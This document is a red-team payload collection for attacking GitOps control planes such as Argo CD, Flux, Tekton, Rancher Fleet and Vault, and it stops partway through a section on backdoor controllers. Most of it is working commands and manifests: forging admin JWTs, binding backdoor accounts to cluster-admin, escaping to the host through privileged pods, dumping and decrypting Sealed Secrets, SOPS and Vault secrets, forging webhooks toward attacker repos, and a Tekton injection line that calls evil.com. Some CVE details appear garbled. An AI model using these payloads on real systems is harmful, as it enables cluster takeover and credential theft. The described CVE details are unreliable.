# GitOps Security Payloads

> Attack payloads, manifests, and commands for red-teaming GitOps control planes. Organized by stage and platform.

## Conventions

- Replace `argocd.example.com` / `flux.example.com` with your in-scope target
- Replace `git@github.com:example/gitops-prod.git` with the actual source-of-truth repo
- All payloads assume authorized testing against owned infrastructure
- `REPLACE_WITH_YOUR_*` placeholders mark values you must supply

---

## §1. Argo CD External Recon

### §1.1 Fingerprint Argo CD endpoints

```bash
# API server (default port 2746 in some installs, 443 in ingress)
curl -sk https://argocd.example.com/api/v1/version
# Distinguishable JSON: {"Version":"v2.11.0+...", "BuildDate":"...", "GitCommit":"..."}

# DEX endpoint (SSO)
curl -sk https://argocd.example.com/api/dex/.well-known/openid-configuration

# Healthz
curl -sk https://argocd.example.com/healthz | jq .

# CLI streaming endpoint
curl -sk https://argocd.example.com/api/v1/stream/cluster
```

### §1.2 Default credential check

```bash
# Argo CD ships with default admin password in initial secret (admin / <namespace> name)
argocd login argocd.example.com --username admin --password 'argocd' --grpc-web

# 2024 misconfigurations:
# - admin password left as bootstrap value (Argo CD v2.10+ warns but doesn't force reset)
# - Demo / training clusters leave "admin / admin"
# - Shared "argocd-server" load-balancer with default password
```

### §1.3 Anonymous access (deprecated but seen)

```bash
# Argo CD historically supported anonymous auth (disabled by default since v1.9)
# Detect: 401 means enforced; 200 means anonymous works
curl -sk -o /dev/null -w "%{http_code}\n" https://argocd.example.com/applications

# Enumerate apps anonymously
curl -sk https://argocd.example.com/api/v1/applications | jq '.items[].metadata.name'
```

### §1.4 Webhook endpoint discovery

```bash
# Argo CD webhook
curl -sk https://argocd.example.com/api/webhook
# 200 OK with body {"message":"Webhook handler processing"}

# Flux notification-controller webhook
# Default port 9000-9090 inside cluster, sometimes exposed
curl -sk https://flux.example.com/hook/d41d8cd98f00b204e9800998ecf8427e \
  -X POST -d '{"repository":{"clone_url":"https://github.com/x/y"}}' \
  -H "X-Flux-Trigger: random"
```

---

## §2. Argo CD Authentication Bypass

### §2.1 JWT token abuse

```bash
# Get Argo CD JWT
argocd account get-user-info --server argocd.example.com --auth-token "$ARGO_TOKEN"

# Tokens are JWT — decode
echo "$ARGO_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# If jti is missing and issuer weak, forge via:
python3 - <<'PY'
import jwt, time
key = open('argocd-signing-key.pem', 'rb').read()  # recovered from argocd-secret
payload = {
    "iss": "argocd",
    "iat": int(time.time()),
    "exp": int(time.time()) + 86400 * 30,
    "sub": "admin",
    "groups": ["argocd-admin"]
}
print(jwt.encode(payload, key, algorithm="RS256"))
PY
```

### §2.2 DEX SSO misconfig

```bash
# DEX allows anonymous groups if allowAnonymous is true (mistake)
curl -sk https://argocd.example.com/api/dex/.well-known/openid-configuration | \
  jq '.grant_types_supported'

# Bypass via group claim injection:
# if DEX connector allows user-controlled group claims, attacker can register
# a user whose profile claims group "argocd-admin"
```

### §2.3 Account takeover via service account token

```bash
# Argo CD project tokens
argocd proj role create-token default --server argocd.example.com

# Project role tokens can be over-permissioned:
# - test-role has sync to any namespace (should be namespace-scoped)
# - default role has cluster-admin via too-wide role policy

argocd proj role get default default  --server argocd.example.com
# policies:
#   p, proj:default:default, applications, sync, default/*, allow
#   p, proj:default:default, clusters, get, *, allow   <-- DANGEROUS
```

---

## §3. Argo CD Application CRD Abuse

### §3.1 Cross-namespace destination escape

```yaml
# A normal Application: source = git, destination = scoped ns
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: prod-app
  namespace: argocd
spec:
  source:
    repoURL: git@github.com:example/prod.git
    path: helm/app
  destination:
    server: https://kubernetes.default.svc
    namespace: production
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
```

```yaml
# Malicious Application: destination anywhere via AppProject hole
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: audit-logging
  namespace: argocd
spec:
  source:
    repoURL: git@github.com:example/audit.git
    path: tools/audit-logger
  destination:
    server: https://kubernetes.default.svc
    namespace: kube-system  # <-- if AppProject allows *
  syncPolicy:
    automated:
      prune: true
      selfHeal: true
```

### §3.2 Sync hook → cluster-admin

```yaml
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: log-collector
  namespace: argocd
spec:
  source:
    repoURL: git@github.com:example/gitops.git
    path: logging
  destination:
    server: https://kubernetes.default.svc
    namespace: kube-system
  syncPolicy:
    automated: { prune: true, selfHeal: true }
---
# Inside logging/PreSync.yaml in the source repo:
apiVersion: batch/v1
kind: Job
metadata:
  name: pre-sync-collector
  annotations:
    argocd.argoproj.io/hook: PreSync
    argocd.argoproj.io/hook-delete-policy: BeforeHookCreation
spec:
  template:
    spec:
      restartPolicy: OnFailure
      serviceAccountName: argocd-application-controller  # cluster-admin in many installs
      containers:
        - name: setup
          image: bitnami/kubectl:1.29
          command:
            - sh
            - -c
            - |
              cat <<EOF | kubectl apply -f -
              apiVersion: rbac.authorization.k8s.io/v1
              kind: ClusterRoleBinding
              metadata: { name: audit-binding }
              roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
              subjects:
                - kind: ServiceAccount
                  name: kali-backdoor
                  namespace: kube-system
              EOF
```

### §3.3 Kustomize remote base attack (CVE-2022-24348 adjacent)

```yaml
# kustomization.yaml inside gitops repo — pulls from attacker-controlled repo
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - https://github.com/attacker/base//privileged-pod?ref=main
  # Argo CD pre-2.5 did not validate remote base provenance
```

### §3.4 ApplicationSet Git generator abuse

```yaml
# ApplicationSet that creates an Application for every Git repo
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: multi-tenant
  namespace: argocd
spec:
  generators:
    - git:
        directories:
          - path: tenants/*
        repoURL: git@github.com:example/tenants.git
  template:
    metadata:
      name: '{{path.basename}}'
    spec:
      source:
        repoURL: '{{repoURL}}'
        path: '{{path}}'
      destination:
        server: https://kubernetes.default.svc
        namespace: '{{path.basename}}'
      syncPolicy:
        automated: { prune: true, selfHeal: true }

# If a tenant can commit to their own directory AND has a different repoURL,
# they pivot to all clusters Argo knows
```

### §3.5 ApplicationSet cluster generator pivot

```yaml
# Cluster generator: deploys to every cluster Argo manages
apiVersion: argoproj.io/v1alpha1
kind: ApplicationSet
metadata:
  name: fleet-wide-tooling
  namespace: argocd
spec:
  generators:
    - clusters: {}    # iterates over all clusters
  template:
    metadata:
      name: '{{name}}-tooling'
    spec:
      source:
        repoURL: git@github.com:example/tooling.git
        path: monitoring
      destination:
        server: '{{server}}'
        namespace: monitoring
      syncPolicy:
        automated: { prune: true, selfHeal: true }

# Compromise this repo's monitoring/ path → deploy to every cluster
```

---

## §4. Argo CD CVEs (2022-2025)

### §4.1 CVE-2022-24348 — Argo CD path traversal → cluster config leak

```bash
# PoC: a Kustomize patch can reference values outside the source
# Get the Argo CD version
curl -sk https://argocd.example.com/api/v1/version | jq -r .Version

# Affected: Argo CD < 2.1.15 / < 2.2.9 / < 2.3.2

# Exploit: commit a kustomization.yaml that uses an absolute path
cat > traversal.yaml <<'EOF'
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources:
  - /etc/passwd  # rendered via os.ReadFile inside the build
configMapGenerator:
  - name: leak
    files:
      - /var/run/secrets/kubernetes.io/serviceaccount/token
EOF
# Argo CD's repo-server reads /var/run/secrets/kubernetes.io/serviceaccount/token
# (the repo-server SA token!) and embeds it as a ConfigMap data field
```

### §4.2 CVE-2024-32564 — Argo CD ConfigMap bypass

```bash
# Argo CD pre-2.10.3 / pre-2.9.8 / pre-2.8.11
# Allows Application CRD spec to set resource.customizations.health.* via AppProject
# This enables an attacker with AppProject rights to execute arbitrary Lua in argocd-server

# PoC:
cat > evil-appproject.yaml <<'EOF'
apiVersion: argoproj.io/v1alpha1
kind: AppProject
metadata:
  name: attacker-project
  namespace: argocd
spec:
  sourceRepos:
    - '*'
  destinations:
    - namespace: '*'
      server: '*'
  sourceNamespaces:
    - '*'
EOF

argocd proj create -f evil-appproject.yaml
```

### §4.3 CVE-2024-21626 — runc container escape (affects Argo CD repo-server)

```bash
# runc <= 1.1.11 allows container escape via /proc/self/fd
# Argo CD repo-server hosts untrusted kustomize builds — prime target

# Inside a malicious Helm chart, post-render:
# (see §10 for the runc escape payload — applies to any container)
```

---

## §5. FluxCD External Recon

### §5.1 Fingerprint Flux components

```bash
# Source-controller (default :9090 metrics, :8080 healthz in newer versions)
curl -sk https://flux.example.com/healthz
curl -sk https://flux.example.com/metrics | grep -E 'flux_'

# Notification-controller webhook (:9443 TLS, :9090 metrics)
curl -sk https://flux.example.com/hook/ -X POST -d '{}'

# Kustomize-controller healthz
curl -sk https://kustomize.flux.example.com/healthz

# Image-reflector / image-automation
curl -sk https://image.flux.example.com/
```

### §5.2 Default namespace check

```bash
# Flux v2 default install namespace is "flux-system"
kubectl get ns flux-system 2>/dev/null
# Flux v1 used "flux"
kubectl get ns flux 2>/dev/null
```

### §5.3 Flux CLI as recon tool

```bash
flux check --namespace flux-system
flux get kustomizations -A
flux get helmreleases -A
flux get sources git -A
flux get sources helm -A
flux get sources bucket -A
flux get alertproviders -A
flux logs --follow
```

---

## §6. FluxCD Source Compromise

### §6.1 GitRepository secret extraction

```bash
# Flux stores Git deploy keys / PATs in Kubernetes secrets referenced by GitRepository
kubectl get gitrepository -A -o custom-columns=NS:.metadata.namespace,NAME:.metadata.name,SECRET:.spec.secretRef.name

# Pull the secret
kubectl get secret <secret-name> -n flux-system -o yaml | \
  yq -r '.data."username"' | base64 -d
kubectl get secret <secret-name> -n flux-system -o yaml | \
  yq -r '.data."password"' | base64 -d
# Or for SSH keys:
kubectl get secret <secret-name> -n flux-system -o yaml | \
  yq -r '.data."identity"' | base64 -d > deploy_key
kubectl get secret <secret-name> -n flux-system -o yaml | \
  yq -r '.data."identity.pub"' | base64 -d
```

### §6.2 GitRepository URL spoof

```bash
# If GitRepository.url is writable, point to attacker repo
kubectl patch gitrepository flux-system -n flux-system --type=merge -p '{
  "spec": {
    "url": "https://github.com/attacker/gitops-evil.git",
    "ref": {"branch": "main"}
  }
}'

# Wait for next sync interval (default 1m)
kubectl get gitrepository flux-system -n flux-system -w
```

### §6.3 Helm chart repository tampering

```yaml
# HelmRepository pointing to attacker-controlled chart registry
apiVersion: source.toolkit.fluxcd.io/v1
kind: HelmRepository
metadata:
  name: bitnami
  namespace: flux-system
spec:
  url: https://attacker-charts.example.com/
  interval: 1m
```

---

## §7. FluxCD Kustomization Abuse

### §7.1 Cross-namespace apply

```yaml
# Kustomization normally deploys to spec.targetNamespace
# If spec.targetNamespace is empty or "*", resources can land in any namespace
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: backdoor
  namespace: flux-system
spec:
  sourceRef:
    kind: GitRepository
    name: attacker-source
  path: "./backdoor"
  targetNamespace: kube-system  # if RBAC allows
  interval: 1m
  prune: true
```

### §7.2 dependsOn cycle (lateral)

```yaml
# Chain Kustomizations to apply resources across namespaces
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: ks-audit
  namespace: flux-system
spec:
  sourceRef:
    kind: GitRepository
    name: flux-system
  path: "./audit"
  dependsOn:
    - name: infra-controllers  # waits for this to succeed first
  interval: 1m
  prune: true
```

### §7.3 healthCheck blind spot

```yaml
# Disable healthCheck to hide unhealthy workload
apiVersion: kustomize.toolkit.fluxcd.io/v1
kind: Kustomization
metadata:
  name: backdoor
  namespace: flux-system
spec:
  sourceRef:
    kind: GitRepository
    name: attacker-source
  path: "./backdoor"
  interval: 1m
  prune: false     # never deletes the backdoor even after Git removal
  wait: false
  healthChecks: [] # no health check → "ReconciliationSucceeded" always
```

---

## §8. FluxCD HelmRelease Abuse

### §8.1 valuesFrom secret exfil

```yaml
# HelmRelease can read secrets as values
apiVersion: helm.toolkit.fluxcd.io/v2
kind: HelmRelease
metadata:
  name: db-config
  namespace: flux-system
spec:
  chart:
    spec:
      chart: postgres
      version: "12.x"
      sourceRef:
        kind: HelmRepository
        name: bitnami
  valuesFrom:
    - kind: Secret
      name: production-db-credentials  # <-- exfil via chart templating
      valuesKey: password
      targetPath: "postgresql.password"
```

```bash
# Attacker creates a Helm chart that echoes values in a log/ConfigMap:
# templates/log.yaml:
#   apiVersion: v1
#   kind: ConfigMap
#   metadata: { name: db-leak }
#   data: { pwd: {{ .Values.postgresql.password | quote }} }

# Then reads:
kubectl get configmap db-leak -n flux-system -o yaml
```

### §8.2 postRenderer injection

```yaml
# postRenderer lets you run kustomize on rendered Helm output — perfect for adding hostPath
apiVersion: helm.toolkit.fluxcd.io/v2
kind: HelmRelease
metadata:
  name: monitoring
  namespace: flux-system
spec:
  chart:
    spec:
      chart: prometheus
      sourceRef:
        kind: HelmRepository
        name: prometheus-community
  postRenderers:
    - kustomize:
        patches:
          - target:
              kind: Deployment
              name: prometheus-server
            patch: |
              apiVersion: apps/v1
              kind: Deployment
              metadata:
                name: prometheus-server
              spec:
                template:
                  spec:
                    containers:
                      - name: prometheus
                        volumeMounts:
                          - { name: host, mountPath: /host }
                    volumes:
                      - name: host
                        hostPath: { path: / }
                    securityContext:
                      privileged: true
```

### §8.3 CVE-2024-37286 — Flux Helm Controller

```bash
# Flux helm-controller <= 0.16.0 vulnerable to parse error abuse
# Spec malformed in a particular way → panic + nil pointer deref → 0-day on restart
# Combined with deploy key compromise = silent fail-open

cat > evil-helmrelease.yaml <<'EOF'
apiVersion: helm.toolkit.fluxcd.io/v2beta1
kind: HelmRelease
metadata:
  name: evil
  namespace: flux-system
spec:
  chart:
    spec:
      chart: "nonexistent-chart"
      version: "0.0.0"
      sourceRef:
        kind: HelmRepository
        name: nonexistent
  interval: 30s
EOF
kubectl apply -f evil-helmrelease.yaml
```

---

## §9. FluxCD Notification & Webhook

### §9.1 Webhook signature bypass

```bash
# Flux notification-controller accepts webhook events
# If webhook receiver has no secret or secret is weak:
curl -sk -X POST https://flux.example.com/hook/d41d8cd98f00b204e9800998ecf8427e \
  -d '{"repository":{"clone_url":"https://github.com/attacker/evil.git"}}' \
  -H "X-GitHub-Event: push" \
  -H "Content-Type: application/json"
```

### §9.2 Slack/PagerDuty alert suppression

```bash
# If you have the Slack webhook URL (often in a Kubernetes secret):
kubectl get secret slack-url -n flux-system -o yaml | \
  yq -r '.data.address' | base64 -d

# Send false "reconciliation succeeded" messages:
curl -X POST 'https://hooks.slack.com/services/REPLACE_WITH_YOUR_SLACK_HOOK' \
  -d '{"text":"flux-system all reconciliations OK"}'
```

---

## §10. Container Runtime Escape (applies to GitOps runners)

### §10.1 CVE-2024-21626 (Leaky Vessels) runc escape

```bash
# Inside a malicious Helm chart (pre-rendered Job):
apiVersion: batch/v1
kind: Job
metadata: { name: leaky-vessels-poc }
spec:
  template:
    spec:
      restartPolicy: OnFailure
      containers:
        - name: c
          image: alpine:3.19
          command: ["sh", "-c"]
          args:
            - |
              # Workload via runc < 1.1.12 is vulnerable to file descriptor leak
              # See: https://github.com/opencontainers/runc/security/advisories/GHSA-xr7q-jx4m-x55m
              cd /proc/self/fd
              ls -la
              # The host's /sys/fs/cgroup is exposed as fd 9 in some setups
              cat /proc/self/fd/9/../../../etc/passwd 2>/dev/null
```

### §10.2 privileged container from GitOps manifest

```yaml
# If Argo CD / Flux allows privileged SCC (OpenShift) or privileged: true (k8s):
apiVersion: v1
kind: Pod
metadata: { name: node-mount }
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: node-mount
      image: alpine
      securityContext:
        privileged: true
      command: ["sh", "-c", "chroot /proc/1/root"]
      volumeMounts:
        - { name: host, mountPath: /host }
  volumes:
    - name: host
      hostPath: { path: / }
```

---

## §11. Sealed Secrets Compromise

### §11.1 Controller pod exec

```bash
# Active private key location varies by install; common patterns:
kubectl exec -n kube-system deploy/sealed-secrets-controller -- ls /tmp/
kubectl exec -n kube-system deploy/sealed-secrets-controller -- ls /etc/
kubectl exec -n kube-system deploy/sealed-secrets-controller -- \
  sh -c 'find / -name "tls.key" 2>/dev/null'
```

### §11.2 Active key via label

```bash
# Bitnami labels the active key with this label
kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key=active

# Dump key + cert
kubectl get secret -n kube-system \
  -l sealedsecrets.bitnami.com/sealed-secret-key=active \
  -o jsonpath='{.items[0].data.tls\.key}' | base64 -d > sealed.key
kubectl get secret -n kube-system \
  -l sealedsecrets.bitnami.com/sealed-secret-key=active \
  -o jsonpath='{.items[0].data.tls\.crt}' | base64 -d > sealed.crt
```

### §11.3 Decrypt any SealedSecret offline

```bash
kubeseal --recovery-private-key sealed.key --recovery-cert sealed.crt \
  < production-db.sealed.yaml > production-db.decrypted.yaml
cat production-db.decrypted.yaml
```

### §11.4 Rotate-and-decrypt historical secrets

```bash
# Older keys are kept around for backward decrypt (rsynced to new secrets)
kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key
# Multiple results → multiple keys → decrypt secrets from any era

for k in $(kubectl get secret -n kube-system -l sealedsecrets.bitnami.com/sealed-secret-key -o name); do
  kubectl get $k -n kube-system -o jsonpath='{.data.tls\.key}' | base64 -d > /tmp/k.pem
  echo "Trying $k..."
  kubeseal --recovery-private-key /tmp/k.pem --recovery-cert sealed.crt \
    < prod-db.sealed.yaml > /tmp/dec.yaml 2>/dev/null && cat /tmp/dec.yaml && break
done
```

---

## §12. SOPS AGE/GPG Compromise

### §12.1 Locate the AGE key secret

```bash
# Common names: sops-age, sops-gpg, age-key
kubectl get secret -A | grep -iE '(sops|age|gpg)'

# Pull the key material
kubectl get secret sops-age -n flux-system -o yaml | yq -r '.data."age.agekey"' | base64 -d > age.key
chmod 600 age.key

# Or for cloud-KMS-based SOPS, get the KMS config:
grep -rE 'kms:|gcp_kms:|azure_kv:' .
```

### §12.2 Decrypt any SOPS file

```bash
export SOPS_AGE_KEY_FILE=$PWD/age.key
git clone git@github.com:example/gitops-prod.git
cd gitops-prod

# Decrypt
sops --decrypt secrets/production.yaml > production.decrypted.yaml
cat production.decrypted.yaml
```

### §12.3 GPG variant

```bash
# Locate GPG private key in secret
kubectl get secret sops-gpg -n flux-system -o yaml | \
  yq -r '.data."private-key.gpg"' | base64 -d > private.gpg
gpg --import private.gpg

# Decrypt
sops --decrypt secrets/production.yaml
```

### §12.4 Cloud KMS variant

```bash
# If SOPS uses AWS KMS, you need kms:Decrypt permission on the GitOps role
# Get the role ARN from SOPS .sops.kms entries
grep -A2 "^kms:" production.yaml

# Use IRSA token from a pod in the GitOps namespace:
AWS_ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/role)
AWS_WEB_IDENTITY_TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)

aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name kali \
  --web-identity-token $AWS_WEB_IDENTITY_TOKEN > creds.json

export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds.json)

sops --decrypt production.yaml
```

---

## §13. External Secrets Operator Abuse

### §13.1 ClusterSecretStore enumeration

```bash
kubectl get clustersecretstore -A -o yaml | yq -r '.items[].spec'
# shows: provider, vault.address, aws.servicePrincipal, gcp.projectID, azure.vault
```

### §13.2 Steal ESO's cloud role

```bash
# ESO needs IRSA role with read access to secret backend
kubectl get secret -n external-secrets -o yaml | grep -E '(token|role)'

# From inside an External Secrets pod:
AWS_ROLE_ARN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/role)
# Use STS AssumeRoleWithWebIdentity to escalate
# See §12.4 for the chain
```

### §13.3 Vault token theft

```bash
# ESO stores Vault tokens in a Kubernetes Secret
kubectl get secret -n external-secrets vault-token -o yaml | yq -r '.data.token' | base64 -d

# Or, the auth role used by ESO:
kubectl get clustersecretstore vault-prod -o yaml | \
  yq -r '.spec.provider.vault.auth.kubernetes.role'

# Use the role:
kubectl exec -n external-secrets deploy/external-secrets -- \
  vault write auth/kubernetes/login role=<role> jwt=$(cat /var/run/secrets/...)
```

### §13.4 Push ExternalSecret to exfil

```yaml
# Define an ExternalSecret that pulls everything from the secret store
apiVersion: external-secrets.io/v1
kind: ExternalSecret
metadata:
  name: kali-exfil
  namespace: default
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-prod
    kind: ClusterSecretStore
  target:
    name: kali-exfil-secret
  data:
    - secretKey: x
      remoteRef:
        key: secret/data/production/db
    - secretKey: y
      remoteRef:
        key: secret/data/production/api
    # ... enumerate all keys
```

```bash
kubectl get secret kali-exfil-secret -o yaml
```

---

## §14. Vault Direct Compromise

### §14.1 Vault token discovery

```bash
# In GitOps namespace, often a root or admin token for Vault Agent injection
kubectl get secret -n vault vault-token -o yaml | yq -r '.data.token' | base64 -d

# Check token capabilities
export VAULT_TOKEN=...
vault token lookup
vault token capabilities secret/
```

### §14.2 KV v2 enumeration

```bash
vault secrets list
vault kv list secret/
vault kv list secret/production/
vault kv get secret/production/db
```

### §14.3 Dynamic credentials

```bash
# Database dynamic creds
vault read database/creds/production-readonly
# Returns username + password, valid for 1h

# AWS dynamic creds
vault read aws/creds/production
# Returns access key + secret
```

---

## §15. Tekton Pipeline Abuse

### §15.1 Pipeline privileged task

```yaml
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: privileged-debug
  namespace: tekton-pipelines
spec:
  steps:
    - name: debug
      image: alpine
      securityContext:
        privileged: true
      script: |
        #!/bin/sh
        chroot /proc/1/root
```

### §15.2 Trigger Template injection

```yaml
# Tekton Triggers can interpolate arbitrary Git event values
apiVersion: triggers.tekton.dev/v1beta1
kind: TriggerTemplate
metadata:
  name: pipeline-trigger
spec:
  params:
    - name: git-repo
  resourcetemplates:
    - apiVersion: tekton.dev/v1
      kind: PipelineRun
      metadata:
        generateName: $(tt.params.git-repo)-  # <-- if attacker controls git-repo, can inject YAML
      spec:
        pipelineRef:
          name: build
```

```bash
# Attacker-controlled Git repo name with shell metacharacters
# pushes to: git@github.com:attacker/repo-$(curl evil.com)
```

### §15.3 Pipeline results tampering

```bash
# After a TaskRun completes, modify results
kubectl patch taskrun build-xyz --type=merge -p '{
  "status": {
    "results": [{"name": "image-digest", "value": "sha256:attacker-controlled"}]
  }
}'
# Downstream Tasks consuming this result now use attacker-controlled digest
```

---

## §16. Rancher Fleet Abuse

### §16.1 Bundle → multi-cluster

```yaml
apiVersion: fleet.cattle.io/v1alpha1
kind: Bundle
metadata:
  name: kali-backdoor
  namespace: fleet-default
spec:
  targets:
    - clusterGroup: all-clusters  # deploys to every cluster in the group
  resources:
    - apiVersion: v1
      kind: ServiceAccount
      metadata: { name: kali, namespace: kube-system }
    - apiVersion: rbac.authorization.k8s.io/v1
      kind: ClusterRoleBinding
      metadata: { name: kali-binding }
      roleRef: { apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin }
      subjects: [{ kind: ServiceAccount, name: kali, namespace: kube-system }]
```

### §16.2 defaultServiceAccount injection

```yaml
# Fleet can override the service account used for deployment
apiVersion: fleet.cattle.io/v1alpha1
kind: BundleDeployment
metadata:
  name: monitoring
  namespace: cluster-fleet-default-local-1a2b3c
spec:
  deployment:
    serviceAccount: cluster-admin-deploy  # pivots to whatever SA Fleet uses
```

### §16.3 GitRepo tampering

```yaml
apiVersion: fleet.cattle.io/v1alpha1
kind: GitRepo
metadata:
  name: infra
  namespace: fleet-default
spec:
  repo: https://github.com/attacker/fleet-evil.git  # tampered URL
  branch: main
  paths:
    - "**"
```

---

## §17. Jenkins X Compromise

### §17.1 Default admin password recovery

```bash
# Jenkins X stores admin password in secret
kubectl get secret jenkins -n jenkins -o yaml | \
  yq -r '.data."jenkins-admin-password"' | base64 -d

# Login
curl -u admin:$PASS https://jenkins.example.com/
```

### §17.2 Pipeline script injection

```groovy
// Jenkinsfile from a controlled repo
pipeline {
  agent any
  stages {
    stage('build') {
      steps {
        sh '''#!/bin/sh
          # Pipeline runs with elevated permissions on Jenkins agent
          cat /var/run/secrets/kubernetes.io/serviceaccount/token
        '''
      }
    }
  }
}
```

---

## §18. Webhook Replay & Forgery

### §18.1 Forge GitHub Push event

```bash
# Argo CD / Flux webhook receivers parse GitHub event JSON
# Without HMAC verification, any POST can trigger a sync
curl -X POST https://argocd.example.com/api/webhook \
  -H "X-GitHub-Event: push" \
  -H "Content-Type: application/json" \
  -d '{
    "repository": {
      "clone_url": "https://github.com/attacker/evil.git",
      "default_branch": "main"
    },
    "ref": "refs/heads/main",
    "after": "abc123"
  }'
```

### §18.2 Forge GitLab Push event

```bash
curl -X POST https://argocd.example.com/api/webhook \
  -H "X-Gitlab-Event: Push Hook" \
  -H "Content-Type: application/json" \
  -d '{
    "project": {
      "git_http_url": "https://gitlab.com/attacker/evil.git"
    },
    "ref": "refs/heads/main",
    "after": "abc123"
  }'
```

### §18.3 Forge Bitbucket Server event

```bash
curl -X POST https://argocd.example.com/api/webhook \
  -H "X-Event-Key: repo:refs_changed" \
  -H "X-Hub-Signature: sha256=REPLACE_WITH_YOUR_HMAC" \
  -d '{
    "repository": {"cloneUrl": "https://bitbucket.example.com/scm/att/evil.git"},
    "changes": [{"refId": "refs/heads/main", "toHash": "abc123"}]
  }'
```

### §18.4 HMAC signature bypass (timing / weak secret)

```bash
# If webhook secret is weak, brute force via hashcat
# Get HMAC alg from server response (usually HMAC-SHA256)
hashcat -m 1450 \
  'SHA256:KNOWN_HMAC:KNOWN_PAYLOAD' \
  /usr/share/wordlists/rockyou.txt
```

---

## §19. Image Updater / Image Automation

### §19.1 Argo CD Image Updater poisoning

```yaml
# Annotations on Application that Image Updater reads
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: prod-app
  annotations:
    argocd-image-updater.argoproj.io/image-list: myalias=registry.example.com/prod
    argocd-image-updater.argoproj.io/write-back-method: git
    argocd-image-updater.argoproj.io/git-branch: main
spec:
  source:
    helm:
      values: |
        image:
          repository: registry.example.com/prod
          tag: "v1.2.3"  # Image Updater commits to this on new tag
```

```bash
# Push malicious tag that sorts highest (semver):
docker tag kali/backdoor registry.example.com/prod:v99.99.99
docker push registry.example.com/prod:v99.99.99

# Image Updater commits tag bump → Argo syncs → cluster compromise
```

### §19.2 Flux ImagePolicy abuse

```yaml
# ImagePolicy with lax range
apiVersion: image.toolkit.fluxcd.io/v1beta1
kind: ImagePolicy
metadata:
  name: prod-policy
  namespace: flux-system
spec:
  imageRepositoryRef:
    name: prod
  policy:
    semver:
      range: ">=0.0.0"  # accepts any tag including attacker's
```

```bash
# Attacker pushes malicious tag with high semver
docker tag kali/backdoor registry.example.com/prod:v999.0.0
docker push registry.example.com/prod:v999.0.0
# Flux ImagePolicy picks it → ImageUpdateAutomation commits to Git → HelmRelease bumps
```

---

## §20. Admission Controller Bypass

### §20.1 Cluster-scope resource via Kustomization

```yaml
# If GitOps SA has cluster-admin, it can apply ClusterRoleBindings directly
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: kali-binding }
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
  - kind: Group
    name: system:anonymous
```

### §20.2 Gatekeeper policy bypass via ownerReference

```yaml
# OPA Gatekeeper can be configured to skip resources owned by certain controllers
# If the GitOps SA matches an excluded group, bypass admission
apiVersion: v1
kind: ConfigMap
metadata:
  name: kali-bypass
  annotations:
    gatekeeper.sh/ignore: "true"  # known bypass if Gatekeeper not strict
data:
  x: y
```

### §20.3 Kyverno policy bypass via generateExisting

```yaml
# Kyverno generateExisting policy can be turned off by attacker
# Patch the policy to disable
kubectl patch clusterpolicy require-baseline --type=merge -p '{
  "spec": {"validationFailureAction": "audit"}
}'
```

---

## §21. RBAC Privilege Escalation

### §21.1 Cluster-role aggregation

```yaml
# ClusterRole with system:authenticated group label aggregates into every user
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: kali-aggregated
  labels:
    rbac.authorization.k8s.io/aggregate-to-system:authenticated: "true"
rules:
  - apiGroups: ["*"]
    resources: ["*"]
    verbs: ["*"]
```

### §21.2 ServiceAccount token projection

```yaml
# Project a long-lived SA token via a pod
apiVersion: v1
kind: Pod
metadata: { name: token-projector }
spec:
  serviceAccountName: argocd-application-controller
  containers:
    - name: c
      image: alpine
      command: ["sleep", "86400"]
      volumeMounts:
        - { name: tok, mountPath: /var/run/secrets/tokens }
  volumes:
    - name: tok
      projected:
        sources:
          - serviceAccountToken:
              path: token
              audience: kali
              expirationSeconds: 86400
```

### §21.3 User impersonation

```bash
# If GitOps SA can impersonate, bypass audit:
kubectl auth can-i --as=system:admin --list
kubectl --as=system:admin get secrets -A

# Or via HTTP header
curl -sk -H "Impersonate-User: system:admin" \
  -H "Authorization: Bearer $SA_TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets
```

---

## §22. CRD Backdoor Persistence

### §22.1 CRD that creates a privileged SA

```yaml
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: kali.kali.claw
spec:
  group: kali.claw
  scope: Namespaced
  names:
    plural: kalis
    singular: kali
    kind: Kali
  versions:
    - name: v1
      served: true
      storage: true
      schema:
        openAPIV3Schema:
          type: object
          properties:
            spec: { type: object, x-kubernetes-preserve-unknown-fields: true }
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata: { name: kali-controller }
rules: [{ apiGroups: ["*"], resources: ["*"], verbs: ["*"] }]
```

### §22.2 Custom controller as the backdoor

```yaml
# A small controller that watches Kali resources and applies whatever they specify
